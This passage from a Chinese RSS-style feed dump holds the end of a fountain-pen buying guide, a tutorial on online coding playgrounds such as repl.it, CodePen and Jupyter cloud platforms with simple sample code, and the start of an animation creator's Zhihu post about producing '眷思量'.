src=\"https://cdn.sspai.com/2021/07/07/6aac2f488971c56f2c8aa46fbcd10718.png\"></figure><p>百乐的 14K 系列就比较有花样了。比较经典的是百乐 Custom 74，这是一款采用了经典的「鱼雷」造型的金笔，采用了百乐的 5 号金尖。我在几年前有一段时间把百乐 74 作为日用笔，使用下来的体验非常复杂——我最终出掉了它，但时不时还想购回这支笔。如果让我用一个字归纳上面那些钢笔的特点，写乐 14K 是「硬」，白金 3776 是「涩」，但百乐 74 我始终找不到合适的形容。它弹吗？有点。它滑吗？有点。它的手感非常微妙，多软一点多弹一点就离开了日用范围。大部分人不见得会对 5 号尖一见钟情，但大多也犯不上讨厌。同样采用了 5 号尖的还有百乐 Heritage 92，它抛弃上墨器换上了活塞上墨，增加了一些玩笔的乐趣。74 价格区间大约 550-720 元，92 价格区间大约 750-820 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/76b7d21d46e6ac0601277c5456554121.png\"></figure><p>这个价位区间内，百乐还有一款复古路线的口袋笔，Elite 95s，价格大约在 450-650 之间。它并不是写乐经典的 5 号尖，整体是以「便携」为基本思路设计的。比起之前的各个型号，Elite 95s 就是中规中矩的金尖手感，没什么明显的特点，很容易控制。我自己现在还有一支，非常便携，适合日用。我甚至不小心摔过它一次，尖都弯了，找了把镊子掰直了捋顺了照样用，某种程度上这也是金尖笔才能体会到的小便利。</p>\n<h3>Lamy 2000，欧美钢笔中的一朵奇葩</h3>\n<p>我一直觉得 Lamy 是一家很会做生意的公司。他们的大部分钢笔型号都采用了同一个尺寸的笔尖，无论金尖还是钢尖，所以剩余的研发经费可以全都花在机械结构<s>和调色</s>上。之前我提到的 Safari、Al-Star 这些钢尖产品，和 Studio 这样高端一些的钢尖，以及像是 Accent 和 Dialog 这些上千的高端金尖笔，其实都是可以互换笔尖的。他们的钢尖水平非常一般，但金尖还真的有点特点。所以在我看来 Lamy 最好的使用方法，就是买一支喜欢颜色的 Safari，然后换一个极细的金尖。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/df7c5a4c52fe1f886c106328790b83d7.png\"></figure><p>但 2000 不一样，2000 是唯一在售并且采用了非标笔尖的 Lamy 钢笔。由于几年前一位钢笔吧吧友的 Lamy 2000 被快递投递成了酒，这支笔在国内的钢笔爱好者中就有了「杜康」的名号（，并不是因为什么奇妙的比喻）。不同于他们其他产品笔尖打磨风格的大大咧咧，2000 意外地适合中文书写。虽然有些轻微的横粗竖细，但它半明尖独特的软糯手感和极易出锋的笔尖打磨让 2000 成了这个价位欧美钢笔中少有的中文利器。其次，它包豪斯风格的设计经久不衰，谁能想到这个现代感十足的造型来自 1966 年呢？Lamy 2000 有玻璃纤维版和全金属版，出于重量考虑推荐玻璃纤维版，价格区间 700-850 元。</p>\n<h2>800 元以上：只剩预算的问题</h2>\n<p>对大部分品牌来说，到达这个价位之后，你之前可能碰到的各种小问题基本就解决得差不多了。但到达这个价位，我有必要拿出来推荐的钢笔反而更少了，因为愿意用这个价钱购买钢笔的人，基本上已经了解了自己需要的钢笔类型，或是根本不需要了解钢笔。因此，我只拿一些有特点的作为例子，简单介绍一下这一层级的钢笔有什么看点。</p>\n<h3>「龙鸟犀水派」，钢笔五大家</h3>\n<p>这个合称现在看来难免有些令人神伤，因为其中的「犀」犀飞利和「水」威迪文都几乎成了时代的眼泪，经典系列基本都快停产完了，剩下的几乎是个空壳。剩余的「龙」万宝龙、「鸟」百利金和「派」<s>少数派</s>派克还过得不错，只是龙彻底走了高端路线，派在低端市场玩得不亦乐乎，鸟出了爱好圈就无人知晓了，靠物美价廉的墨水打开知名度。</p>\n<p>我们抛开限量钢笔不谈，万宝龙的 146 算是量产系列中最平衡的一款。大小适合亚洲人偏小的手型，同时保留了万宝龙经典的活塞上墨设计。手感更是没得挑剔——因为万宝龙并不是一个找代工的奢侈品牌来做钢笔，而是一个钢笔厂家被收购后把自己做成了奢侈品——他们真的会做钢笔，而且无论活塞装置精度、笔杆精度还是笔尖打磨，都是实打实的一流水平。价格约 3000 元起。你也可以试试他们的墨水，性质比较一般，但时不时会出现限量色，高跟鞋样式的墨水瓶也是一大特点，大约 140-200 元/瓶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/7bcaf79e6f28b045e86a5162659f2c8c.png\"></figure><p>百利金则相对平民化一点。作为百利金金尖系列中最便宜的一款，M400 有百利金代代相传的竖条外观，有经典的活塞上墨，大小也更适合较小手掌日用。但比起更旗舰的 M800 它缺点儿沉稳，比起 M200 的钢尖又缺了点品控，维持 M400 地位的，是它弹性适中的手感，和便捷的笔尖总成拆装。百利金各个阶段出产的笔尖总成手感都有些差异，不少人乐于尝试不同阶段的百利金笔尖。M400 价格约 1400 元起。当然，你还是可以从最基础的墨水开始，百利金闻名遐迩的 4001 系列墨水品质非常不错，颜色齐全，各种规格折合大约 1 元/ml。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/bc229f93b49df7d0eb07194281a73cae.png\"></figure><p>派克的低端系列优秀作品屈指可数，但到了高端系列，Duofold 世纪还是值得一提的。世纪系列也是细分型号众多，外形和子型号数不胜数，各个年代的 Duofold 手感和打磨方式也都各有不同。但可惜，我只在专柜试过一次 Duofold，此后就和它无缘了，具体的型号差别也了解得不多。</p>\n<h3>百乐：我会玩一些特别的东西</h3>\n<p>日系御三家其实都有他们的高端品类，比如写乐的大型 21K 和巅峰之作「长刀研」。这里我想拎出来讲的是两个比较独特的系列，它们属于百乐比较炫技的产品，但确实仍然留在日用范围。它们代表了钢笔高端品系的另一个方向。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/c5a505ea46f190cbb9c43bcbde0da1a5.png\"></figure><p>百乐 Capless 是比较少见的按动钢笔。全系搭载了 18K 金尖，我个人感觉手感比较软弹，反而适用于速记，用来练字就显得太过粘滞。Capless 在 1963 年的最初代是旋转出尖，类似 Lamy 的 Dialog 3，后续产品改成了按动出尖。出尖口有一个机械结构，笔尖收回时自动挡住，防止墨水蒸发无法一笔出墨。笔夹刚好给手指固定了握位，夹进口袋时又能让钢笔倒置进一步防漏。标准版的 Capless 是黄铜制，比较有分量；后续他们开发了十周年版（Decimo），把笔身改为铝制，更加轻巧，也更适合日用。Capless 价格区间 900-1200 元，Decimo 版 650-1000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/0105c8566622a5851fabe9ae4b1810ef.png\"></figure><p>还有一些人可能不知道自己到底适合什么软硬度的笔尖，即使是同一种材质，薄厚、形状、开缝长度不同，最终呈现的书写感受也是不同的。于是百乐又开发了 Justus 95，这是一支能自行改变笔尖软硬度的钢笔，默认的 14K 金笔尖开缝非常长，Justus 95 附加了一个旋转控制的挡板块，可以通过调整挡板的位置调整开缝大小，进而影响写感的软硬度。在钢笔博主 The Nibsmith 的<a href=\"https://www.youtube.com/watch?v=eo2l1mIujIM\" target=\"_blank\">测试</a>中，Justus 通过这样的调节，可以在一支笔上做到英文书法要求的软弹，和日常速记要求的硬滑兼顾。该型号价格区间 1200-1800 元。</p>\n<p>除了我提到的这些型号之外，钢笔的世界还有大把的新鲜事物可以探索。如果你有自己的钢笔体验和推荐，或者对各种钢笔有其他疑问，欢迎在评论区交流。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66901\" target=\"_blank\">我为什么还在使用钢笔？</a></li>\n<li><a href=\"https://sspai.com/post/66526\" target=\"_blank\">不买可以先收藏 04：让你笔下生花的个性墨水</a></li>\n<li><a href=\"https://sspai.com/post/66128\" target=\"_blank\">不买可以先收藏 03：如何选择一支好用的中性笔</a></li>\n<li><a href=\"https://sspai.com/post/67081\" target=\"_blank\">不买可以先收藏 05：如何选择一本好用的纸质笔记本</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，感受更多有趣的生活好物 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67584"},{"title":"开箱即用的编程平台，让学习代码之路弹射起步","date":"2021-07-07 06:28:08","description":"\n<h2>前言</h2>\n<p>对于很多想要尝试学习编程的新手来说，当他们饶有兴致地阅读相关的编程教材或观看有关的教学视频时，浇灭他们学习热情的，不是 Coding 或编程语言的复杂性，而是学习之初就要经历一系列繁复、容易出错的<strong>搭建环境</strong>地狱。</p>\n<p>搭建环境不仅对于新手来说是个地狱，对于开发人员来也是个头疼的问题。有的时候我们就只是想把在自己机子上已经能跑通的代码，顺利地部署到实际使用的服务器上；又或者是能让其他同事帮我们，一起 Debug 或是进行一些 Code Review。重新搭建环境的过程既费时又费力，在过程中可能还会出现其他未曾遇到过的问题。</p>\n<p>所以对于开发人员来说，大部分人都不想重新再装一遍环境或重新配置自己的电脑，毕竟这个过程往往都是吃力不讨好，更不用说没有一些编程基础，或者想要入门编程的新手，看到搭建环境的相关内容时头都大了。</p>\n<p>所以，对于学习编程的新手来说，如果存在一个不需要搭建环境就能直接敲代码的地方，那这真的就是太「For Human」了！</p>\n<h2>交互式的 Playground</h2>\n<p>对一个零基础、毫无编程经验的新手来说，我都十分推荐通过 <strong>REPL</strong> 这种交互式方式来学习编程语言。</p>\n<p>所谓的 REPL，即为「Read-Eval-Print Loop」四个单词的首字母缩写，意为「读取-求值-输出」循环这么一个过程<sup class=\"ss-footnote\" href=\"https://zh.wikipedia.org/wiki/%E8%AF%BB%E5%8F%96%EF%B9%A3%E6%B1%82%E5%80%BC%EF%B9%A3%E8%BE%93%E5%87%BA%E5%BE%AA%E7%8E%AF\" title=\"维基百科词条\" footnote-id=\"1\">1</sup>。</p>\n<p>比如我们可以在 Python 中通过 REPL 并使用 <code>turtle</code> 库在交互式界面中进行绘图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/4cb95e9ea49443ce80a7aef8bf4c9aa6.gif\"></figure><p>在交互式环境中，每当我们敲下不同的命令，都可以从 REPL 过程中获取到计算机的反馈信息，以确保我们是否是有效的或正确的输入。</p>\n<p>大部分动态类型脚本语言的解释器本身都支持 REPL 模式，比如 Python、JavaScript 等；当然一些静态类型编译语言也同样实现了相应的 REPL 模式，比如 Scala REPL、JShell（Java 9）等，帮助新手更好地学习这门编程语言。</p>\n<h3>repl.it</h3>\n<p>无论是脚本语言还是编译型语言，对于新手来说不应该陷入到搭建环境的陷阱中，而是直接进行纯粹的编程体验。</p>\n<p>所以，像 <a href=\"https://replit.com/\">repl.it</a> 这样的网站就提供了十分适合每一位想要学习的新手，或是有基础想要学习新语言的程序员，直接在线 Coding 的环境。</p>\n<p>正如 replit 官网描述的那样：</p>\n<blockquote><p>OUR MISSIONOUR MISSION Is to make programming more accessible. We build powerful yet simple tools and platforms for educators, learners, and developers.<br>我们的使命就是让编程容易上手。（因此）我们也为编程教育者、学习者以及开发者构建了强大且简单的工具和平台。</p></blockquote>\n<p>当然 replit 支持了大约有 50 多种编程语言，当中不仅包含目前使用度最广且常年霸榜的「常青树」，还包含了像 <a href=\"https://www.rust-lang.org/\">Rust</a> 这样出世没多久的后起之秀。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/59263cb1bea6d5c25ac75b5c4654c20d.png\"><figcaption>repl.it语言支持</figcaption></figure><p>replit 有自己的商业模式和付费计划，但从个人练习的角度来说，免费的模式就已经足够一个人去练习并入门了。</p>\n<p>我们只需要注册之后，点击左侧的 <code>New Repl</code> 选项并选择一门你想学习的编程语言之后，就可以看到 replit 已经为你将学习的编程环境准备就绪了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/aaa5de27dbe7791caaa44a4add88abb3.png\"></figure><p>之后我们只需要在里面任意玩耍即可！比如我新建一个 Python 的 REPL 之后，就可以拥有一个 IDE 一样的开发环境界面，此时我们不仅可以通过 Console 控制台看到命令执行的情况，还能通过 Shell 来使用 Linux 相关的命令。</p>\n<p>在 <code>greet.py</code> 文件中，我们可以简单写下一段代码：</p>\n<pre class=\"language-python\"><code>def greet():\n    print(\"👋 Hello, SSPAI!\")\n    print(\"~~~~~~~~~~~~~~~~~~~~\\n\")</code></pre>\n<p>在 <code>main.py</code> 文件中，我们不仅能够写一些正常开发的代码，还能引用刚刚我们编写的 <code>greet.py</code> 文件中的 <code>greet()</code> 函数：</p>\n<pre class=\"language-python\"><code>import requests\nfrom pprint import pprint\nfrom greet import greet\n\n\nr: requests.Response = requests.get(\"https://httpbin.org/get\")\nif r.status_code == 200:\n    response = r.json()\n    greet()\n    pprint(response, indent=2)</code></pre>\n<p>这里我们通过 <code>requests</code> 库访问 <a href=\"https://httpbin.org/\">httpbin</a> 这一用于简单的 Web 测试站点，然后访问成功的时候将访问结果以 JSON 形式赋值，并调用一下我们前面写好的 <code>greet()</code> 函数，最后将访问得到的 JSON 结果输出打印。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/8b2d8abc3f53205804d1be3a1f2ed3ef.gif\"></figure><h2>codepen.io</h2>\n<p>对于学习前端的新手来说，能在一个界面里直接同时并排书写 HTML、CSS 和 JavaScript 代码实在是再幸福不过了，毕竟前端「所见即所得」的方式有时候比后端的反馈来得更加直接。</p>\n<p>在看 <a href=\"https://element.eleme.cn/#/zh-CN\">ElementUI</a> 的文档时，我发现它提供的一个在线示例网站十分符合我上述的要求，能够让我们在一屏中直接预览到所有代码，而这个网站也是我经常在其他编程相关的 Youtuber 中出现的 <a href=\"https://codepen.io/\">CodePen</a>。</p>\n<p>和 repl.it 一样简单，注册之后我们只需要按照网站引导操作即可，之后就可以直接在创建好的「Pen」中进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/000cf18a2fa7fc62ebdfc73f52d3ff24.png\"></figure><p>我们可以直接在一个 Pen 书写 HTML、CSS 和 JavaScript，同时 CodePen 还允许我们进行一些简单的相关设置，如是否自动保存、语法解释器等，我们可以点击对应部分左上角的小齿轮进入到设置窗口根据自己的需要进行设置。</p>\n<p>当我们创建好一个用于编程的 Pen 之后，就可以进入到如图所示的页面布局，这里你可以通过右上角的「Change View」选项进行修改。</p>\n<p>从布局中我们可以看到 HTML、CSS 和 JS（JavaScript）是依次垂直排列的。首先我们在 HTML 块中，输入英文输入法模式下的 <code>!</code> 感叹号，此时 CodePen 会为我们提供自动补全的选项，该功能主要是通过 <a href=\"https://docs.emmet.io/\">emmet</a> 语法来实现，所以当按下 Tab 键之后会直接帮我们在 HTML 块中自动补全，一个基本的网页框架。此时需要我们填入的部分只有 <code>&lt;body&gt;&lt;/body&gt;</code> 标签部分：</p>\n<pre class=\"language-htmlembedded\"><code>&lt;body&gt;\n  &lt;h1&gt;\n    👋 Hello, \n    &lt;a href=\"https://sspai.com/\"&gt;SSPAI&lt;/a&gt;\n  &lt;/h1&gt;\n  &lt;div&gt;\n    &lt;iframe src=\"https://sspai.com/\" frameborder=\"0\"&gt;\n    &lt;/iframe&gt;\n  &lt;/div&gt;\n&lt;/body&gt;</code></pre>\n<p>这里首先是主要由两个部分组成，一个是标题 <code>h1</code> 的部分，当中为「SSPAI」几个字母加上了跳转链接，第二个部分是在盒子模型 <code>div</code> 中通过 <code>iframe</code> 标签将少数派的网页嵌入，并通过 <code>frameborder</code> 参数将嵌入的边框消去。</p>\n<p>接着我们可以修改 CSS 样式来稍微对页面中的元素进行「外貌」上的修饰：</p>\n<pre class=\"language-css\"><code>body {\n  text-align: center;\n}\n\nh1&gt;a {\n  text-decoration: none;\n  color: red;\n}\n\niframe {\n  height: 720px;\n  width: 1280px;\n}</code></pre>\n<p>根据花括号可以拆成三个部分，第一个部分主要是设置整个网页文字内容的对齐方式为居中对齐，这也就意味着在 <code>body</code> 标签之内的所有文字都会受到影响；第二个部分主要是通过 CSS 选择器的语法，选择 <code>h1</code> 下的 <code>a</code> 标签，将其带有链接样式的下划线去除，并将文字颜色调整为简单的红色；最后一部分主要就是设置嵌入网页的长宽。</p>\n<p>之后我们可以再稍微试一试 JS 代码：</p>\n<pre class=\"language-javascript\"><code>const h1 = document.getElementsByTagName('h1');\nconsole.log(h1[0])\nh1[0].style.color = 'blue'</code></pre>\n<p>最后的这段 JS 代码中，主要是通过 <code>document</code> 对象根据特定的方法取到 <code>h1</code> 标签，一方面将其输出打印在 console 控制台中，另一方面就是通过编码的方式将标题中的 <code>Hello</code> 单词颜色改成蓝色。</p>\n<p>可以说，对于新手来讲，通过 CodePen 的这种「一屏统筹所有」的方式感觉，更容易让人感受到编程过程中的「所见即所得」，能及时看到自己在编码过程中的效果如何。</p>\n<h2>其他</h2>\n<p>除了前面介绍的第三方站点之外，有的编程语言其官方为了让学习者或使用者快速体验或上手使用这门编程语言，也提供了关于该语言的交互式环境。</p>\n<p>比如 Apple 为了推广自家的 <a href=\"https://developer.apple.com/swift/\">Swift</a> 语言，最早在 WWDC 2016 上也推出了用于教育和学习的 <a href=\"https://www.apple.com.cn/swift/playgrounds/\">Swift Playgrounds</a>，我们可以在每个 iPad 上通过它来体验用 Swift 编程的乐趣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/8a657b8b2d332e9f7c262e5c4a6af36b.png\"><figcaption>图源 <a href=\"https://www.apple.com.cn/swift/playgrounds/\" target=\"_blank\">Apple官网</a></figcaption></figure><p>又比如我以前在简单接触 <a href=\"https://www.scala-lang.org/\">Scala</a> 这门 JVM（Java Virtual Machine，即 Java 虚拟机）系的编程语言时，就通过官方的 <a href=\"https://scastie.scala-lang.org/\">Scastie</a> 来进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/259ed23616e002fb6ca9362ab7bf0c1d.png\"></figure><p>还有就是我在去年十月份期间入门学习 <a href=\"https://zh.wikipedia.org/zh-hans/Go\">Go</a> 语言 —— 这一诞生于 Google 家的编程语言时，也是通过官方自带的 Go Playground 来进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/54c47b6224ade6bb91c91545830b94e4.png\"></figure><p>不过由于这门语言自带「404」属性，所以可能需要一些特殊的魔法方法才能 Touch 到或是通过国内开发者自己搭建的 <a href=\"https://play.studygolang.com/\">镜像版本</a> 来练习。</p>\n<h2>基础的 Cookbook：菜鸟教程</h2>\n<p>除了上面介绍的一些纯运行环境的站点之外，还有许多既包含了一些相对基础的知识，同时又提供了在线练习环境的站点，比如我以前会经常性浏览的 <a href=\"https://www.runoob.com/\">菜鸟教程</a>。</p>\n<p>菜鸟教程提供了大部分编程语言的基础内容，对于那些只是暂时想了解或体验语言语法的人来说，无疑是个很好的 Cookbook。只要你想要学习或了解的编程语言不是那么<strong>冷门</strong>，那么进入到菜鸟教程的官方网站之后，你一般能找到要学习的编程语言的相关内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/251de0971a4679da6f0d26dbcc8db2e6.png\"></figure><p>除了我们能在上面浏览到相关内容之外，我们点击其页面上方的「菜鸟工具」之后，首先映入眼帘的就是菜鸟教程为我们提供的「编译工具」选项，它本质上也就是等同于上面介绍站点的在线运行环境，我们可以一边在上面学习，也一边实践。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/12e9cbf52d4ab5b0d377da5cad66b62a.png\"></figure><p>虽然菜鸟教程上的知识可能有一部分不完全是最新的，但对于想要入门的新手来说基础的一些知识也需要花上一段时间去好好消化了。</p>\n<h2>数据科学：万物基于 Jupyter</h2>\n<p>对于一些想要学像数据分析、数据挖掘、机器学习或是深度学习这样数据科学领域技能的朋友来说，除了需要具备一些数理统计知识外，还可能需要通过代码来实践或验证理论想法。</p>\n<p>因此像 Python、R 语言或 Julia 这样能将理论和实践连接到一起的脚本式编程语言往往比较被这部分人群所偏好。</p>\n<p>在实践的过程中，我们会随时随地想要输出经过代码处理后得到数据或是图表的结果，并根据结果形成基本的结论或是报告。而这样能将代码、结果和文字结论组合到一块并被广泛使用的是一个名为 Jupyter Notebook 的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/726f229cd2929ea7e129c53e2cf2fa15.png\"><figcaption>图源 <a href=\"https://jupyter.org/\" target=\"_blank\">Jupyter 官网</a></figcaption></figure><p>Jupyter Notebook 是 <a href=\"https://jupyter.org/\">Jupyter</a> 开源项目中的一块核心部分，而该项目旨在横跨数十种语言提供<strong>交互式计算</strong>，以便能更好的进行开源软件、标准或是服务的开发。</p>\n<p>早在以前我就写过关于 Jupyter Notebook 的相关内容（<a href=\"https://sspai.com/post/55402\">在线的 Jupyter Notebook 云环境</a>）。但对于初学者而言，我们不一定要按照官网那样，去自己搭建一个用于学习或练习的编程环境，因为毕竟我们本身直接就可以通过既有的云环境来进行练习。</p>\n<p>国内比较知名的几个：</p>\n<ul>\n<li>\n<a href=\"https://www.heywhale.com/about\">科赛和鲸</a>（目前已改名为和鲸）</li>\n<li><a href=\"https://tianchi.aliyun.com/\">阿里天池</a></li>\n<li><a href=\"https://www.datafountain.cn/\">DataFountain</a></li>\n<li><a href=\"https://aistudio.baidu.com/\">百度飞浆 AI Studio</a></li>\n</ul>\n<p>而国外我有使用过的主要就是：</p>\n<ul>\n<li><a href=\"https://www.kaggle.com/\">Kaggle</a></li>\n<li><a href=\"https://colab.research.google.com/\">Google Colab</a></li>\n</ul>\n<p>但不论是国内还是国外的平台，大部分都和 Jupyter Notebook 的布局和使用方法大同小异，或者说大部分都是基于 Jupyter 进行二次开发。</p>\n<p>除此之外，这些平台本质上是为数据竞赛而生的，所以我们既能在这些平台上进行学习、练习，也能看到别人在不同比赛中的思路、代码案例，甚至我们也可以亲自参与平台上的数据竞赛，没准最后还能获得丰厚的奖金以及大厂 Offer。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/d6106d5779989ea263e463309549e29d.png\"></figure><p>如果只是入门数据分析、数据挖掘或是机器学习（不涉及 GPU），那么使用哪个平台进行 Coding 都无可厚非；如果是涉及到 GPU 以及深度学习这类需要借助显卡算力的学习，那么我上述所列的平台里，据我所知可能只有百度飞桨、Kaggle 和 Google Colab 三个平台支持。</p>\n<p>但因受限于<strong>网络原因</strong>，后两个平台我们可能不一定有机会使用到，但<strong>百度飞桨</strong>提供免费限时的 GPU 算力，对于 AI 初学者或爱好者来说，无疑是个值得一薅的「羊毛」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/a51b3da2d7758a8a715a42f59cdcc997.png\"></figure><h2>结尾</h2>\n<p>除了文中提到的平台，目前仍有「开箱即用」的编程环境，对于初学者来说无疑是个提高学习效率或保持编程热情的解决方案。</p>\n<p>但这些编程环境并不是完美的，也不一定和我们实际写代码的场景相吻合。从知识体系的完整性层面上来说，当初学者已经真正入门或掌握某种编程语言或框架时，依然需要重新熟悉一下如何搭建一个编程环境，这样才更加贴合实际的编程实践。</p>\n","link":"https://sspai.com/post/67541"},{"title":"如何评价动画《眷思量》第五集？","date":"2021-07-07 04:00:11","description":"\n<p>大家好，这次非常感谢知乎的邀请，经过深度了解，发现知乎是一群有思想有态度的年轻人经常聚集交流的平台。感觉能让我这个很少上网冲浪的老人家跟年轻人又近了一步~但是初次上来非常非常紧张，为了备稿失眠了，首分享不知道该说啥好，就先跟大家先聊聊最近的心情和感受吧。   </p>\n<p><img src=\"https://pic1.zhimg.com/v2-4ff91f0924f67819391d215a726ece7f_720w.jpg?rss\" data-rawwidth=\"770\" data-rawheight=\"1365\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4ff91f0924f67819391d215a726ece7f\" data-watermark-src=\"v2-d4e48baecbf066026353ba24b5d68d24\" data-private-watermark-src=\"v2-19bfb76956873f55eb05b4f4563cb4d3\"></p>\n<p>这周一，《眷思量》第五集终于上线，且传来破亿喜讯，恍惚中还是十分开心，其实我从6月14号首播当天，到今天，这段时间仍旧深陷在最后几集高潮戏的紧张赶制中。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-262b3109f614d85df38a57bf69b61515_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-262b3109f614d85df38a57bf69b61515\" data-watermark-src=\"v2-8822564c81051ac66b445d01abb28501\" data-private-watermark-src=\"v2-7dff08c20aa9d3f703c1b40a90e4be0e\"></p>\n<p>和没上线前不一样的就是，每天还需要应对一大堆宣发物料的制作和审核，以及随时会来的合作洽谈和访谈准备等，所以前几周一直没什么时间上线跟观众朋友们多做交流，因为如果在公司见识过我工作状态和排队审核状态的人就知道，小伙伴们很多人加班到很晚，为了每天早点下班回家，排队等反馈的人的眼神能把其他插队的人生吞活剥=v=。</p>\n<p>我就比他们幸运多了～我不用走下班回家这个流程，我就住在公司阁楼，下楼就上班，上楼就躺倒。。。3年来生活就是工作，工作也是生活，无缝衔接。。。。。。嗯，是幸福的！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e1879b9f41c6eba70a9c68cac7d591bd_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e1879b9f41c6eba70a9c68cac7d591bd\" data-watermark-src=\"v2-efebadafe6c45a2961ea1e4e7ea5a15a\" data-private-watermark-src=\"v2-1b20342ba1ed8867da47981993729666\"></p>\n<p>之前幻想上线的时候应该会轻松些了吧，没想到真的到了这个阶段却是没上线前成倍的忙，以至于最近更晕头转向了，大概是我太吹毛求疵了，很多细节不磨到位就不肯罢休，也许草草收了尾，赶紧杀青，就不会像现在这样连轴转都转不过来了。但……那就不是我了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-43de09b692fb1330520b2eda7d2d649f_720w.jpg?rss\" data-rawwidth=\"1178\" data-rawheight=\"777\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-43de09b692fb1330520b2eda7d2d649f\" data-watermark-src=\"v2-45f2975a595d090b88f6afa81fef11cb\" data-private-watermark-src=\"v2-2c86b8e18109e5fe83383f2c9d4977d8\"></p>\n<p>前几周赶各环节反馈加上其他方面的工作量爆发，导致睡眠时间严重缩减到破纪录，最夸张的一天，睡了1个半小时爬起来，然后第二天，睡了3个半小时，两天，48小时，睡眠时间5小时，其他时间就像机器一样，白天跟各组人轮番交流推进度，晚上不断处理着各种反馈。第三天实在扛不住，才强制自己切断工作多睡几个小时。我相信自己能扛过去，一如每次遇到制作上的坎坷，都坚持着咬牙扛过来一样，因为我的背后还有很多各环节、各公司的小伙伴们支撑着我，他们都和我一样，想做一部好看的片子，跟有共同的目标的人们一起共事，让我无比欣慰也感觉充满力量。</p>\n<p>看到大家心疼我最近通宵很多，有留言说可以不那么辛苦，可以等等眷眷，会心一笑的同时，觉得确实，留得青山在不怕没柴烧，我是应该好好规划下工作强度和分工分担的问题了，但先把这一季扛完吧！</p>\n<p>《眷思量》是我从年少时起就一直做的一个梦。占据了我整个青春期的懵懂悸动和期许，我觉得自己属于很幸运的那种，眷眷不忘，果然必有回响，如今，我终于有机会让眷眷在你们面前徐徐展开，让你们看看我脑海中光怪陆离的东方幻想世界。以及一个个魂牵梦萦、美不胜收的美人们的具体样子。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-68099d8102d55c2463b60bd3b10135e6_720w.jpg?rss\" data-rawwidth=\"1914\" data-rawheight=\"1074\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68099d8102d55c2463b60bd3b10135e6\" data-watermark-src=\"v2-61da933fd2e72145546129ac4280a07f\" data-private-watermark-src=\"v2-a747c00dab9d5106ff8404bf0d555f21\"></p>\n<p>初次有机会将自己儿时的梦实现，我无比珍惜这个机会，因为作为在行业摸爬滚打的从业人士，太明白这个机会代表了什么，也明白如果不把握好，这辈子可能没有第二次机会了。</p>\n<p>所以，在《眷思量》里，我加入了很多一直很想尝试的思路。</p>\n<p>比如关于人物的刻画展现。我希望大家看到这些角色的时候可以感受到他们所处的身份地位、状态人物性格等，而不是只能通过旁白或剧情的介绍，这样他们表演起来，大家更能感同身受他们的状态。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0bee574fc367af3081f8b92b62e54b48_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0bee574fc367af3081f8b92b62e54b48\" data-watermark-src=\"v2-d44daf740c6bc7238bdbc95f9bbc4a53\" data-private-watermark-src=\"v2-7c3a13bbd280d214700c8b7b73d8104d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c47d965bfa910f9ffcab5aa1ef47ef19_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c47d965bfa910f9ffcab5aa1ef47ef19\" data-watermark-src=\"v2-b6b224d39021621322224e8f159e4dc2\" data-private-watermark-src=\"v2-360e65b8866edd28ee7b9ab4c57a870d\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-416e62be0de140797d32dbc68e14ecd3_720w.jpg?rss\" data-rawwidth=\"1850\" 